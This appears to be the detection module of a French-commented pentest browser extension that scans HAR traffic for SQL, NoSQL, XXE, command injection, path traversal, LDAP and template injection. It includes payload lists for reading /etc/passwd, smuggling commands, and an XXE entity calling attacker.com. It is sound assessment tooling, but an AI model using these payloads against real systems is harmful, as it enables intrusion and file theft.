/**
 * InjectionDetector.js - Détection passive d'indicateurs d'injection
 * PentestHAR v2.1.0
 *
 * Détecte les signes d'injections dans les réponses HTTP :
 * - SQL Injection (erreurs MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
 * - NoSQL Injection (MongoDB, CouchDB)
 * - XXE/XML Injection
 * - Command Injection (output shell)
 * - Path Traversal
 * - LDAP Injection
 * - Template Injection (SSTI)
 */

class InjectionDetector {
  constructor() {
    // Patterns de détection d'erreurs SQL dans les réponses
    this.sqlErrorPatterns = [
      // MySQL
      {
        regex: /SQL syntax.*MySQL|mysql_fetch|mysql_num_rows|mysql_query|mysqli_/gi,
        db: 'MySQL',
        severity: 'critical'
      },
      {
        regex: /Warning.*mysql_|You have an error in your SQL syntax/gi,
        db: 'MySQL',
        severity: 'critical'
      },
      // PostgreSQL
      {
        regex: /PostgreSQL.*ERROR|pg_query|pg_exec|PG::SyntaxError/gi,
        db: 'PostgreSQL',
        severity: 'critical'
      },
      {
        regex: /ERROR:\s+syntax error at or near/gi,
        db: 'PostgreSQL',
        severity: 'critical'
      },
      // Microsoft SQL Server
      {
        regex: /Driver.*SQL[\-\_\ ]*Server|OLE DB.*SQL Server|SQL Server.*Driver/gi,
        db: 'MSSQL',
        severity: 'critical'
      },
      {
        regex: /Unclosed quotation mark after the character string|Microsoft OLE DB Provider for ODBC Drivers/gi,
        db: 'MSSQL',
        severity: 'critical'
      },
      {
        regex: /\[Microsoft\]\[ODBC SQL Server Driver\]/gi,
        db: 'MSSQL',
        severity: 'critical'
      },
      // Oracle
      {
        regex: /ORA-\d{5}|Oracle.*Driver|Oracle.*Error/gi,
        db: 'Oracle',
        severity: 'critical'
      },
      {
        regex: /PLS-\d{5}|TNS:.*listener/gi,
        db: 'Oracle',
        severity: 'critical'
      },
      // SQLite
      {
        regex: /SQLite\/JDBCDriver|SQLite\.Exception|System\.Data\.SQLite\.SQLiteException|SQLITE_ERROR/gi,
        db: 'SQLite',
        severity: 'critical'
      },
      {
        regex: /sqlite3\.OperationalError|near ".*": syntax error/gi,
        db: 'SQLite',
        severity: 'critical'
      },
      // Générique
      {
        regex: /SQL syntax error|sql error|syntax error.*sql|invalid query/gi,
        db: 'Unknown',
        severity: 'high'
      },
      {
        regex: /SQLSTATE\[\d+\]|PDOException/gi,
        db: 'PDO',
        severity: 'critical'
      }
    ];

    // Patterns NoSQL (MongoDB, CouchDB, etc.)
    this.nosqlErrorPatterns = [
      {
        regex: /MongoError|MongoDB.*Error|Cannot convert.*to ObjectId/gi,
        db: 'MongoDB',
        severity: 'critical'
      },
      {
        regex: /BSON.*invalid|BSONTypeError|Invalid BSON/gi,
        db: 'MongoDB',
        severity: 'high'
      },
      {
        regex: /CouchDB.*error|{"error":".*","reason":".*"}/gi,
        db: 'CouchDB',
        severity: 'high'
      },
      {
        regex: /Mongoose.*Error|Cast to ObjectId failed/gi,
        db: 'MongoDB/Mongoose',
        severity: 'high'
      }
    ];

    // Patterns XXE/XML
    this.xxePatterns = [
      {
        regex: /<!ENTITY\s+\w+\s+SYSTEM/gi,
        type: 'xxe_entity',
        severity: 'critical',
        description: 'Entité XML externe détectée'
      },
      {
        regex: /<!DOCTYPE[^>]*SYSTEM\s*["'][^"']*["']/gi,
        type: 'xxe_doctype',
        severity: 'critical',
        description: 'DOCTYPE avec référence SYSTEM'
      },
      {
        regex: /java\.io\.FileNotFoundException|javax\.xml\.parsers/gi,
        type: 'xxe_java_error',
        severity: 'high',
        description: 'Erreur Java XML parser'
      },
      {
        regex: /lxml\.etree\.XMLSyntaxError|xml\.parsers\.expat\.ExpatError/gi,
        type: 'xxe_python_error',
        severity: 'high',
        description: 'Erreur Python XML parser'
      },
      {
        regex: /SimpleXMLElement::__construct|DOMDocument::load/gi,
        type: 'xxe_php_error',
        severity: 'high',
        description: 'Erreur PHP XML'
      }
    ];

    // Patterns Command Injection
    this.commandInjectionPatterns = [
      {
        regex: /sh:\s*\d+:\s*\w+:|bash:\s+\w+:|\/bin\/sh:|\/bin\/bash:/gi,
        type: 'shell_error',
        severity: 'critical',
        description: 'Erreur shell détectée'
      },
      {
        regex: /root:x:\d+:\d+:|daemon:x:\d+:\d+:/gi,
        type: 'passwd_leak',
        severity: 'critical',
        description: 'Contenu /etc/passwd exposé'
      },
      {
        regex: /uid=\d+\(\w+\)\s+gid=\d+\(\w+\)/gi,
        type: 'id_output',
        severity: 'critical',
        description: 'Output commande id'
      },
      {
        regex: /\[boot loader\]|\[operating systems\]/gi,
        type: 'boot_ini',
        severity: 'critical',
        description: 'Contenu boot.ini exposé'
      },
      {
        regex: /Permission denied|command not found|No such file or directory/gi,
        type: 'cmd_error',
        severity: 'medium',
        description: 'Erreur système potentielle'
      },
      {
        regex: /total\s+\d+\s*\n(drwx|lrwx|-rwx)/gim,
        type: 'ls_output',
        severity: 'high',
        description: 'Output commande ls'
      }
    ];

    // Patterns Path Traversal
    this.pathTraversalPatterns = [
      {
        regex: /\.\.\/|\.\.\\|%2e%2e%2f|%2e%2e\/|\.\.%2f|%2e%2e%5c/gi,
        type: 'traversal_sequence',
        severity: 'high',
        description: 'Séquence de traversée détectée'
      },
      {
        regex: /\/etc\/passwd|\/etc\/shadow|\/etc\/hosts/gi,
        type: 'unix_path',
        severity: 'critical',
        description: 'Chemin système Unix'
      },
      {
        regex: /c:\\windows\\|c:\\boot\.ini|c:\\inetpub/gi,
        type: 'windows_path',
        severity: 'critical',
        description: 'Chemin système Windows'
      },
      {
        regex: /\[extensions\]|\[fonts\]|; for 16-bit app support/gi,
        type: 'win_ini',
        severity: 'high',
        description: 'Contenu fichier INI Windows'
      }
    ];

    // Patterns LDAP Injection
    this.ldapPatterns = [
      {
        regex: /LDAP error|Invalid DN syntax|javax\.naming\.directory/gi,
        type: 'ldap_error',
        severity: 'high',
        description: 'Erreur LDAP'
      },
      {
        regex: /NamingException|LdapException|SearchResultEntry/gi,
        type: 'ldap_java',
        severity: 'high',
        description: 'Erreur LDAP Java'
      },
      {
        regex: /ldap_search|ldap_bind|ldap_connect/gi,
        type: 'ldap_php',
        severity: 'medium',
        description: 'Fonction LDAP PHP exposée'
      }
    ];

    // Patterns Template Injection (SSTI)
    this.sstiPatterns = [
      {
        regex: /TemplateSyntaxError|UndefinedError|jinja2\.exceptions/gi,
        type: 'jinja2',
        severity: 'high',
        description: 'Erreur Jinja2'
      },
      {
        regex: /freemarker\.template|FreeMarker template error/gi,
        type: 'freemarker',
        severity: 'high',
        description: 'Erreur FreeMarker'
      },
      {
        regex: /Velocity\.Exception|VelocityException/gi,
        type: 'velocity',
        severity: 'high',
        description: 'Erreur Velocity'
      },
      {
        regex: /twig\.error|Twig_Error/gi,
        type: 'twig',
        severity: 'high',
        description: 'Erreur Twig'
      },
      {
        regex: /49|7\*7=49|7\s*\*\s*7\s*=\s*49/g,
        type: 'ssti_calc',
        severity: 'medium',
        description: 'Possible calcul SSTI (7*7)'
      }
    ];

    // Paramètres suspects pour injection
    this.suspiciousParamPatterns = [
      // SQL keywords
      /(\bSELECT\b|\bUNION\b|\bINSERT\b|\bUPDATE\b|\bDELETE\b|\bDROP\b)/i,
      // SQL operators
      /('|--|#|;|\/\*|\*\/|@@|@|char\(|chr\(|concat\()/i,
      // NoSQL operators
      /(\$where|\$gt|\$lt|\$ne|\$regex|\$or|\$and)/i,
      // Command injection
      /(;|\||\||`|\$\(|&&|\|\||>|<|&)/,
      // Path traversal
      /(\.\.\/|\.\.\\|%2e%2e)/i,
      // XXE
      /(<!ENTITY|<!DOCTYPE)/i,
      // LDAP
      /(\*\)|\)\(|\(\||\|[^|])/,
      // SSTI
      /(\{\{|\}\}|\{%|%\}|\$\{|\})/
    ];
  }

  /**
   * Analyse une entrée HAR pour détecter des indicateurs d'injection
   * @param {Object} harEntry - Entrée HAR
   * @param {string} responseContent - Contenu de la réponse
   * @returns {Array} Liste des findings d'injection
   */
  analyze(harEntry, responseContent = '') {
    const findings = [];

    // Analyser la réponse pour des erreurs/fuites
    if (responseContent) {
      findings.push(...this.detectInResponse(harEntry, responseContent));
    }

    // Analyser les paramètres de la requête pour des payloads suspects
    findings.push(...this.detectSuspiciousParams(harEntry));

    return findings;
  }

  /**
   * Détecte les indicateurs d'injection dans la réponse
   */
  detectInResponse(harEntry, content) {
    const findings = [];
    const url = harEntry.request?.url || '';

    // SQL Injection errors
    for (const pattern of this.sqlErrorPatterns) {
      const matches = content.match(pattern.regex);
      if (matches) {
        findings.push({
          type: 'sql_injection_indicator',
          subtype: 'error',
          severity: pattern.severity,
          database: pattern.db,
          description: `Erreur SQL ${pattern.db} détectée dans la réponse`,
          evidence: this.truncate(matches[0], 100),
          url: url,
          recommendation: 'Vérifier les requêtes SQL et utiliser des requêtes préparées'
        });
        break; // Une seule erreur SQL par réponse suffit
      }
    }

    // NoSQL Injection errors
    for (const pattern of this.nosqlErrorPatterns) {
      const matches = content.match(pattern.regex);
      if (matches) {
        findings.push({
          type: 'nosql_injection_indicator',
          subtype: 'error',
          severity: pattern.severity,
          database: pattern.db,
          description: `Erreur NoSQL ${pattern.db} détectée`,
          evidence: this.truncate(matches[0], 100),
          url: url,
          recommendation: 'Valider et échapper les entrées utilisateur pour les requêtes NoSQL'
        });
        break;
      }
    }

    // XXE patterns
    for (const pattern of this.xxePatterns) {
      const matches = content.match(pattern.regex);
      if (matches) {
        findings.push({
          type: 'xxe_indicator',
          subtype: pattern.type,
          severity: pattern.severity,
          description: pattern.description,
          evidence: this.truncate(matches[0], 100),
          url: url,
          recommendation: 'Désactiver les entités externes dans le parser XML'
        });
      }
    }

    // Command Injection
    for (const pattern of this.commandInjectionPatterns) {
      const matches = content.match(pattern.regex);
      if (matches) {
        findings.push({
          type: 'command_injection_indicator',
          subtype: pattern.type,
          severity: pattern.severity,
          description: pattern.description,
          evidence: this.truncate(matches[0], 100),
          url: url,
          recommendation: 'Ne jamais exécuter de commandes système avec des entrées utilisateur'
        });
      }
    }

    // Path Traversal
    for (const pattern of this.pathTraversalPatterns) {
      const matches = content.match(pattern.regex);
      if (matches) {
        findings.push({
          type: 'path_traversal_indicator',
          subtype: pattern.type,
          severity: pattern.severity,
          description: pattern.description,
          evidence: this.truncate(matches[0], 100),
          url: url,
          recommendation: 'Valider et normaliser les chemins de fichiers'
        });
      }
    }

    // LDAP Injection
    for (const pattern of this.ldapPatterns) {
      const matches = content.match(pattern.regex);
      if (matches) {
        findings.push({
          type: 'ldap_injection_indicator',
          subtype: pattern.type,
          severity: pattern.severity,
          description: pattern.description,
          evidence: this.truncate(matches[0], 100),
          url: url,
          recommendation: 'Échapper les caractères spéciaux LDAP'
        });
      }
    }

    // SSTI
    for (const pattern of this.sstiPatterns) {
      const matches = content.match(pattern.regex);
      if (matches) {
        findings.push({
          type: 'ssti_indicator',
          subtype: pattern.type,
          severity: pattern.severity,
          description: pattern.description,
          evidence: this.truncate(matches[0], 100),
          url: url,
          recommendation: 'Ne pas permettre aux utilisateurs de contrôler le contenu des templates'
        });
      }
    }

    return findings;
  }

  /**
   * Détecte des paramètres suspects dans la requête
   */
  detectSuspiciousParams(harEntry) {
    const findings = [];
    const url = harEntry.request?.url || '';

    // Extraire les paramètres de l'URL
    try {
      const urlObj = new URL(url);
      for (const [name, value] of urlObj.searchParams) {
        const suspicion = this.analyzeParamValue(name, value);
        if (suspicion) {
          findings.push({
            type: 'suspicious_parameter',
            subtype: suspicion.type,
            severity: 'medium',
            param: name,
            description: `Paramètre suspect: ${suspicion.description}`,
            evidence: this.truncate(value, 50),
            url: url,
            recommendation: suspicion.recommendation,
            testPayloads: suspicion.payloads
          });
        }
      }
    } catch (e) {
      // URL invalide, ignorer
    }

    // Analyser le body de la requête
    const postData = harEntry.request?.postData?.text;
    if (postData) {
      // JSON body
      try {
        const json = JSON.parse(postData);
        this.analyzeJsonObject(json, '', findings, url);
      } catch (e) {
        // Form data ou autre format
        const params = new URLSearchParams(postData);
        for (const [name, value] of params) {
          const suspicion = this.analyzeParamValue(name, value);
          if (suspicion) {
            findings.push({
              type: 'suspicious_parameter',
              subtype: suspicion.type,
              severity: 'medium',
              param: name,
              location: 'body',
              description: `Paramètre POST suspect: ${suspicion.description}`,
              evidence: this.truncate(value, 50),
              url: url,
              recommendation: suspicion.recommendation
            });
          }
        }
      }
    }

    return findings;
  }

  /**
   * Analyse une valeur de paramètre
   */
  analyzeParamValue(name, value) {
    if (!value || value.length < 2) return null;

    // Vérifier les patterns suspects
    for (const pattern of this.suspiciousParamPatterns) {
      if (pattern.test(value)) {
        // Déterminer le type d'injection potentielle
        if (/SELECT|UNION|INSERT|UPDATE|DELETE|DROP|--|'|;/i.test(value)) {
          return {
            type: 'sql',
            description: 'Possible payload SQL Injection',
            recommendation: 'Tester avec des payloads SQLi',
            payloads: ["' OR '1'='1", "'; DROP TABLE--", "1 UNION SELECT NULL--"]
          };
        }
        if (/\$where|\$gt|\$ne|\$regex/i.test(value)) {
          return {
            type: 'nosql',
            description: 'Possible payload NoSQL Injection',
            recommendation: 'Tester avec des opérateurs MongoDB',
            payloads: ['{"$gt": ""}', '{"$ne": null}', '{"$where": "1==1"}']
          };
        }
        if (/;|\||\||`|\$\(/i.test(value)) {
          return {
            type: 'command',
            description: 'Possible payload Command Injection',
            recommendation: 'Tester avec des séparateurs de commandes',
            payloads: ['; id', '| cat /etc/passwd', '`whoami`']
          };
        }
        if (/\.\.\/|\.\.\\|%2e%2e/i.test(value)) {
          return {
            type: 'path_traversal',
            description: 'Possible Path Traversal',
            recommendation: 'Tester avec des séquences de traversée',
            payloads: ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini']
          };
        }
        if (/\{\{|\$\{/i.test(value)) {
          return {
            type: 'ssti',
            description: 'Possible Server-Side Template Injection',
            recommendation: 'Tester avec des expressions de template',
            payloads: ['{{7*7}}', '${7*7}', '#{7*7}']
          };
        }
      }
    }

    return null;
  }

  /**
   * Analyse récursivement un objet JSON
   */
  analyzeJsonObject(obj, path, findings, url) {
    if (!obj || typeof obj !== 'object') return;

    for (const [key, value] of Object.entries(obj)) {
      const currentPath = path ? `${path}.${key}` : key;

      if (typeof value === 'string') {
        const suspicion = this.analyzeParamValue(key, value);
        if (suspicion) {
          findings.push({
            type: 'suspicious_parameter',
            subtype: suspicion.type,
            severity: 'medium',
            param: currentPath,
            location: 'json_body',
            description: `Paramètre JSON suspect: ${suspicion.description}`,
            evidence: this.truncate(value, 50),
            url: url,
            recommendation: suspicion.recommendation
          });
        }
      } else if (typeof value === 'object') {
        this.analyzeJsonObject(value, currentPath, findings, url);
      }
    }
  }

  /**
   * Génère des payloads de test pour un endpoint
   */
  generateTestPayloads(harEntry) {
    const payloads = {
      sql: [],
      nosql: [],
      xss: [],
      command: [],
      pathTraversal: [],
      xxe: [],
      ssti: []
    };

    // SQL Injection payloads
    payloads.sql = [
      "' OR '1'='1",
      "' OR '1'='1' --",
      "1' ORDER BY 1--",
      "1 UNION SELECT NULL--",
      "'; WAITFOR DELAY '0:0:5'--",
      "1; SELECT SLEEP(5)--"
    ];

    // NoSQL payloads
    payloads.nosql = [
      '{"$gt": ""}',
      '{"$ne": null}',
      '{"$regex": ".*"}',
      '{"$where": "this.password.match(/.*/)"}',
      "'; return '' == '",
      '[$ne]=1'
    ];

    // Command Injection payloads
    payloads.command = [
      '; id',
      '| cat /etc/passwd',
      '`whoami`',
      '$(id)',
      '& ping -c 1 127.0.0.1 &',
      '\n/bin/cat /etc/passwd'
    ];

    // Path Traversal payloads
    payloads.pathTraversal = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\win.ini',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '/etc/passwd%00.png'
    ];

    // XXE payloads
    payloads.xxe = [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>'
    ];

    // SSTI payloads
    payloads.ssti = [
      '{{7*7}}',
      '${7*7}',
      '<%= 7*7 %>',
      '#{7*7}',
      '*{7*7}',
      '{{constructor.constructor("return this")()}}'
    ];

    return payloads;
  }

  /**
   * Résumé des findings par type
   */
  getSummary(findings) {
    const summary = {
      total: findings.length,
      bySeverity: { critical: 0, high: 0, medium: 0, low: 0 },
      byType: {}
    };

    for (const f of findings) {
      summary.bySeverity[f.severity] = (summary.bySeverity[f.severity] || 0) + 1;
      summary.byType[f.type] = (summary.byType[f.type] || 0) + 1;
    }

    return summary;
  }

  /**
   * Tronque une chaîne
   */
  truncate(str, maxLength) {
    if (!str) return '';
    if (str.length <= maxLength) return str;
    return str.substring(0, maxLength) + '...';
  }
}

// Export global pour Firefox extension
if (typeof window !== 'undefined') {
  window.InjectionDetector = InjectionDetector;
}

// Export pour Node.js (tests)
if (typeof module !== 'undefined' && module.exports) {
  module.exports = InjectionDetector;
}
